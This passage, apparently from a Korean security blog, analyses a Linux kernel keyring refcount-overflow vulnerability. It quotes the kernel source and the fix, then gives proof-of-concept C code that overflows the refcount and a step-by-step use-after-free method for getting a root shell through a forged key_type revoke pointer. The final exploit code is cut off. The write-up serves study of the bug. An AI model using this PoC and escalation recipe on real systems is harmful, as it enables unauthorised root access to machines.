caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h3 id="real-cred-vs-cred"><a href="#real-cred-vs-cred" class="headerlink" title="real_cred vs cred"></a>real_cred vs cred</h3><ul><li>linux에서는 한 task가 다른 task에 접근할 때 작용하는 권한과, 다른 task가 이 task에 접근하기 위해서 가지고 있어야 하는 권한을 분리해 놓았다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><ul><li>real_cred (1) : 다른 task가 이 task에 접근하기 위해서 가지고 있어야 하는 권한을 의미한다.</li><li>cred (2) : 이 task가 다른 task에 접근하거나, 특정 작업을 수행할 때 행사하는 권한을 의미한다.</li></ul><h2 id="part2-name이-NULL일-경우"><a href="#part2-name이-NULL일-경우" class="headerlink" title="part2 : name이 NULL일 경우"></a>part2 : name이 NULL일 경우</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = serial;</span><br><span class="line"><span class="keyword">goto</span> okay;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>join_session_keyring()함수의 인자인 name이 없다면, install_session_keyring_to_cred() 함수를 호출한다.</li><li>수정후 commit_creds(new)호출을 통해 수정된 cred를 커밋 시킨다.</li></ul><h3 id="install-session-keyring-to-cred"><a href="#install-session-keyring-to-cred" class="headerlink" title="install_session_keyring_to_cred"></a>install_session_keyring_to_cred</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Install a session keyring directly to a credentials struct.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">install_session_keyring_to_cred</span><span class="params">(struct cred *cred, struct key *keyring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">old</span>;</span></span><br><span class="line"></span><br><span class="line">might_sleep();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create an empty session keyring */</span></span><br><span class="line"><span class="keyword">if</span> (!keyring) &#123;</span><br><span class="line">flags = KEY_ALLOC_QUOTA_OVERRUN;</span><br><span class="line"><span class="keyword">if</span> (cred-&gt;session_keyring)</span><br><span class="line">flags = KEY_ALLOC_IN_QUOTA;</span><br><span class="line"></span><br><span class="line">keyring = keyring_alloc(<span class="string">&quot;_ses&quot;</span>, cred-&gt;uid, cred-&gt;gid, cred,</span><br><span class="line">KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ,</span><br><span class="line">flags, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(keyring))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(keyring);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">__key_get(keyring);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* install the keyring */</span></span><br><span class="line">old = cred-&gt;session_keyring;</span><br><span class="line">rcu_assign_pointer(cred-&gt;session_keyring, keyring);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (old)</span><br><span class="line">key_put(old);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>install_session_keyring_to_cred()함수의 역할은 cred 구조체에 직접적으로 session keyring을 등록한다.</li><li>즉, install_session_keyring_to_cred(new,NULL)은 익명의 keyring을 만들고, 이 keyring을 new cred에 등록한다.</li></ul><h2 id="part3-name이-NULL이-아닐-경우"><a href="#part3-name이-NULL이-아닐-경우" class="headerlink" title="part3 : name이 NULL이 아닐 경우"></a>part3 : name이 NULL이 아닐 경우</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line">keyring = find_keyring_by_name(name, <span class="literal">false</span>); </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line">keyring = keyring_alloc(</span><br><span class="line">name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123; </span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">commit_creds(<span class="keyword">new</span>);</span><br><span class="line">mutex_unlock(&amp;key_session_mutex); </span><br><span class="line"></span><br><span class="line">ret = keyring-&gt;serial; </span><br><span class="line">key_put(keyring); </span><br><span class="line">okay:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>mutex_lock을 통해 자원 접근을 막는다.</li><li>find_keyring_by_name 함수를 호출해 같은 name의  keyring이 있는지 확인한다.</li><li>이름이 없다면, <ul><li>해당 name으로 keyring을 만든다. (keyring_alloc)</li><li>만든 keyring을 cred 구조체 new에 등록한다. (install_session_keyring_to_cred)</li><li>수정한 내용을 커밋한다. (commit_creds)</li><li>뮤텍스를 해제한다. (mutex_unlock)</li><li>keyring-&gt;usage를 감소시킨다. (key_put)</li><li>새로 생성한 keyring-&gt;serial을 반환한다.</li></ul></li><li>이름이 있다면,<ul><li>goto error2로 이동한다.  </li><li>뮤텍스를 해제한다.</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>여기서 해당 부분이 취약점을 일으키는데, keyring의 이름이 현재 session의 keyring과 같으면 바로 goto error2로 이동하게 된다.</li><li>이 과정에서 keyring-&gt;usage에 대한 Integer OverFlow가 발생한다.</li><li>어떻게 취약점이 발생하는지 알기 위해서는 먼저 find_keyring_by_name 함수를 알아야 한다.</li></ul><h3 id="find-keyring-by-name"><a href="#find-keyring-by-name" class="headerlink" title="find_keyring_by_name"></a>find_keyring_by_name</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct key *<span class="title">find_keyring_by_name</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">bool</span> skip_perm_check)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line"><span class="keyword">int</span> bucket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!name)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">bucket = keyring_hash(name);</span><br><span class="line"></span><br><span class="line">read_lock(&amp;keyring_name_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (keyring_name_hash[bucket].next) &#123;</span><br><span class="line"><span class="comment">/* search this hash bucket for a keyring with a matching name</span></span><br><span class="line"><span class="comment"> * that&#x27;s readable and that hasn&#x27;t been revoked */</span></span><br><span class="line">list_for_each_entry(keyring,</span><br><span class="line">    &amp;keyring_name_hash[bucket],</span><br><span class="line">    type_data.link</span><br><span class="line">    ) &#123;</span><br><span class="line"><span class="keyword">if</span> (!kuid_has_mapping(current_user_ns(), keyring-&gt;user-&gt;uid))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (test_bit(KEY_FLAG_REVOKED, &amp;keyring-&gt;flags))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(keyring-&gt;description, name) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!skip_perm_check &amp;&amp;</span><br><span class="line">    key_permission(make_key_ref(keyring, <span class="number">0</span>),</span><br><span class="line">   KEY_NEED_SEARCH) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* we&#x27;ve got a match but we might end up racing with</span></span><br><span class="line"><span class="comment"> * key_cleanup() if the keyring is currently &#x27;dead&#x27;</span></span><br><span class="line"><span class="comment"> * (ie. it has a zero usage count) */</span></span><br><span class="line"><span class="keyword">if</span> (!atomic_inc_not_zero(&amp;keyring-&gt;usage))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">keyring-&gt;last_used_at = current_kernel_time().tv_sec;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">keyring = ERR_PTR(-ENOKEY);</span><br><span class="line">out:</span><br><span class="line">read_unlock(&amp;keyring_name_lock);</span><br><span class="line"><span class="keyword">return</span> keyring;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>find_keyring_by_name 함수는 list를 돌아가며 같은 이름의 keyring이 있는지 찾아준다.</li><li>여기서 같은 이름이 있다면 마지막 부분에 atomic_inc_not_zero(&amp;keyring-&gt;usage)를 호출한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * atomic_inc_not_zero - increment unless the number is zero</span></span><br><span class="line"><span class="comment"> * @v: pointer of type atomic_t</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Atomically increments @v by 1, so long as @v is non-zero.</span></span><br><span class="line"><span class="comment"> * Returns non-zero if @v was non-zero, and zero otherwise.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> atomic_inc_not_zero</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> atomic_inc_not_zero(v)atomic_add_unless((v), 1, 0)</span></span><br></pre></td></tr></table></figure><ul><li>atomic_inc_not_zero(&amp;keyring-&gt;usage)는 keyring-&gt;usage가 0이 아니면 증가시킨다.</li><li>여기서 증가된 keyring-&gt;usage는 반드시 key_put을 통해 감소시켜야 하는데, 감소시키는 부분이 존재하지 않음을 확인할 수 있다.</li><li>keyring-&gt;usage는 atomic_t == int형 이므로, 계속 증가시킨다면 Integer OverFlow를 발생시킬 수 있다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">key_put(keyring); <span class="comment">//patched</span></span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>패치된 코드를 보면, goto error2로 가기 전에 key_put(keyring)을 통해 증가된 keyring-&gt;usage를 감소시키는 것을 확인할 수 있다.</li><li>이를 통해 Integer OverFlow를 막을 수 있다.</li></ul><h2 id="poc-code"><a href="#poc-code" class="headerlink" title="poc code"></a>poc code</h2><ul><li>취약점을 증명하기 위한 PoC코드는 다음과 같다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">key_serial_t</span> serial;</span><br><span class="line"></span><br><span class="line">        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL);</span><br><span class="line"></span><br><span class="line">        keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /proc/keys&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>먼저 “TestSession”이라는 name의 keyring을 만들고, 다시 한 번 같은 이름의 keyring을 만든다.</li><li>keyctl_join_session_keyring은 find_keyring_by_name를 호출 할 것이며 이를 통해 keyring-&gt;usage는 계속 증가할 것이다.</li><li>keyring의 정보는 /proc/keys에서 확인 할 수 있다.</li></ul><p><img src="https://user-images.githubusercontent.com/70257118/98797011-6165a600-244f-11eb-9955-a46887866a07.png" alt="334"></p><ul><li>위와 같이 “TestSession”의 refcount가 계속 증가하는 것을  확인할 수 있다.</li><li>만약 0xffffffff(2^32)번 만큼 실행을 시킨다면, Integer OverFlow를 통하여 refcount를 0으로 초기화 시킬 수 있을 것이다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">key_serial_t</span> serial;</span><br><span class="line"></span><br><span class="line">        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xffffffff</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">&quot;cat /proc/keys&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>keyctl(KEYCTL_JOIN_SESSION_KEYRING,”TestSession”)을 2^32번 반복한 후, /proc/keys를 확인한다.</li></ul><h2 id="How-to-exploit"><a href="#How-to-exploit" class="headerlink" title="How to exploit?"></a>How to exploit?</h2><ol><li>Key 오브젝트에 대한 정상적인 참조를 가지고 있는다.</li><li>해당 Keyring 오브젝트의 Usage를 Overflow 시킨다.</li><li>Keyring 오브젝트를 free시킨다. </li><li>user space에서 이미 free된 keyring 공간에 새로운 커널 오브젝트를 할당한다.</li><li>이전의 keyring 오브젝트를 참조하게 하여 코드를 실행시킨다.</li></ol><ul><li>exploit의 핵심 함수는 key_revoke()이다.</li></ul><h3 id="key-revoke"><a href="#key-revoke" class="headerlink" title="key_revoke()"></a>key_revoke()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">key_revoke</span><span class="params">(struct key *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">time64_t</span> time;</span><br><span class="line">key_check(key);</span><br><span class="line"><span class="comment">/* make sure no one&#x27;s trying to change or use the key when we mark it</span></span><br><span class="line"><span class="comment"> * - we tell lockdep that we might nest because we might be revoking an</span></span><br><span class="line"><span class="comment"> *   authorisation key whilst holding the sem on a key we&#x27;ve just</span></span><br><span class="line"><span class="comment"> *   instantiated</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">down_write_nested(&amp;key-&gt;sem, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (!test_and_set_bit(KEY_FLAG_REVOKED, &amp;key-&gt;flags) &amp;&amp;</span><br><span class="line">    key-&gt;type-&gt;revoke)</span><br><span class="line">key-&gt;type-&gt;revoke(key); </span><br><span class="line"><span class="comment">/* set the death time to no more than the expiry time */</span></span><br><span class="line">time = ktime_get_real_seconds();</span><br><span class="line"><span class="keyword">if</span> (key-&gt;revoked_at == <span class="number">0</span> || key-&gt;revoked_at &gt; time) &#123;</span><br><span class="line">key-&gt;revoked_at = time;</span><br><span class="line">key_schedule_gc(key-&gt;revoked_at + key_gc_delay);</span><br><span class="line">&#125;</span><br><span class="line">up_write(&amp;key-&gt;sem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>key_revoke()에서 key-&gt;type-&gt;revoke(key)를 호출한다. </li><li>여기서 revoke는 key_type구조체에 있는 멤버이며, 함수 포인터이다.</li><li>즉, revoke를 우리가 원하는 함수의 주소로 덮어쓴 후 호출시킬수 있다.</li><li>revoke부분을 commit_creds(prepare_kernel_cred(0))가 호출되도록 덮어야 한다.</li><li>prepare_kernel_cred(0)을 호출,  root의 권한의 task를 가지고 commit_creds를 실행하기 때문에 현재 프로세스의 권한이 root가 되기 때문이다.</li></ul><h2 id="exploit-method"><a href="#exploit-method" class="headerlink" title="exploit method"></a>exploit method</h2><ul><li>user space에서 가짜 key_type을 만든다.</li><li>key_revoke가 실행될 때 root권한을 얻을 수 있도록 key_type-&gt;revoke에 commit_creds(prepare_kernel_cred(0))주소를 넣는다.</li><li>메세지 큐를 생성하고, 이때 이전에 free된 keyring의 위치가 재사용 된다.</li><li>메세지 큐를 이용해 keyring에 맞게 가짜 key_type을 전달한다.</li><li>keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING)를 호출한다.</li><li>key-&gt;type-&gt;revoke = commit_creds(prepare_kernel_cred(0))가 실행되어 root권한을 획득한다.</li><li>execl(“/bin/sh”, “/bin/sh”, NULL)을 호출하여 쉘을 획득한다.</li></ul><h2 id="exploit-Code"><a href="#exploit-Code" class="headerlink" title="exploit Code"></a>exploit Code</h2><ul><li>최종 exploit code는 다음과 같다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span 